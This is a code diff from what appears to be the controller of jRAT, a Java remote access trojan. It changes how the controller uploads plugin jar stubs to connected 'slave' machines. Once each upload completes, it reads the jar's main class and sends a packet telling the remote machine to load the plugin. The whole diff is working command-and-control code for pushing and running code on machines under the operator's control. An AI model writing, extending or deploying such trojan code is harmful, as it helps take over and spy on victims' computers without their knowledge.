@@ -1,5 +1,7 @@
 package io.jrat.controller.packets.incoming;
 
+import io.jrat.common.Logger;
+import io.jrat.common.utils.JarUtils;
 import io.jrat.controller.Globals;
 import io.jrat.controller.Main;
 import io.jrat.controller.OfflineSlave;
@@ -9,7 +11,7 @@ import io.jrat.controller.events.Event;
 import io.jrat.controller.events.Events;
 import io.jrat.controller.net.ConnectionHandler;
 import io.jrat.controller.packets.outgoing.Packet101UploadPlugin;
-import io.jrat.controller.packets.outgoing.Packet42ServerUploadFile;
+import io.jrat.controller.packets.outgoing.Packet106ServerUploadPlugin;
 import io.jrat.controller.settings.Settings;
 import io.jrat.controller.settings.StatisticsOperatingSystem;
 import io.jrat.controller.settings.StoreOfflineSlaves;
@@ -22,6 +24,7 @@ import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.jar.JarFile;
 
 import jrat.api.Plugin;
 
@@ -52,30 +55,41 @@ public class Packet3Initialized extends AbstractIncomingPacket {
 			Map<String, File> filesToTransfer = new HashMap<String, File>();
 
 			for (String sp : notInstalled) {
-				Plugin plugin = Plugins.getPlugin(sp);
+				final Plugin plugin = Plugins.getPlugin(sp);
 				File[] files = Globals.getPluginStubDirectory().listFiles();
 
-				for (File stubFile : files) {
+				for (final File stubFile : files) {
 					if (stubFile.getName().startsWith(plugin.getName())) {
 						Main.debug("Found stub plugin " + stubFile.getName() + " for plugin " + plugin.getName());
+						
 						filesToTransfer.put(plugin.getName(), stubFile);
+						
+						Main.debug("Transferring " + plugin.getName());
+
+						slave.addToSendQueue(new Packet106ServerUploadPlugin(stubFile, plugin.getName(), new UploadThread(null, plugin.getName(), stubFile) {
+							@Override
+							public void onComplete() {
+								String mainClass = null;
+
+								try {
+									mainClass = JarUtils.getMainClassFromInfo(new JarFile(stubFile));
+								} catch (Exception ex) {
+									ex.printStackTrace();
+									Logger.log("Failed loading main class from plugin.txt, trying meta-inf");
+									try {
+										mainClass = JarUtils.getMainClass(new JarFile(stubFile));
+									} catch (Exception e) {
+										e.printStackTrace();
+									}
+								}
+								
+								slave.addToSendQueue(new Packet101UploadPlugin(mainClass, plugin.getName()));
+							}
+						}));
+						
 						continue;
 					}
 				}
-			}
-
-			for (final String key : filesToTransfer.keySet()) {
-				File file = filesToTransfer.get(key);
-
-				Main.debug("Transferring " + key);
-
-				slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true, new UploadThread(null, key, file) {
-					@Override
-					public void onComplete() {
-						super.onComplete();
-						slave.addToSendQueue(new Packet101UploadPlugin(key));
-					}
-				}));
 			}
 		}
 	}
